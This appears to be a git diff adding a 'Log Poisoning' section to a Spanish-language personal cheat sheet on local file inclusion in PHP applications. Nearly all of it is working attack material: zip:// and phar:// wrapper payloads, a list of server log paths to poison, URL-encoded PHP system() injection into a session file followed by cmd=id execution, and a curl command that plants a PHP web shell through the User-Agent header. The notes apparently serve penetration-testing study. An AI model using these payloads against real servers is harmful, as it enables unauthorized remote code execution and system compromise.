@@ -69,6 +69,28 @@ Despues revisar en el codigo en que ruta esta para leerlo
 zip://./profile_images/shell.jpg%23shell.php&cmd=id
 phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
 ```
+## Log Poisoning
+Recuerda que esto tambienn se puede hacer en direntes log como:
+/var/log/apache2/access.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+/var/log/auth.log
+```
+# Recuerda cambiar el PHPSESSID
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
+
+# INjectando el rce
+http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+#EJcutandolo
+http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+```
+O en apache
+```
+echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
+```
 
 # Fuzzing
 [LFI-wordlist](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)
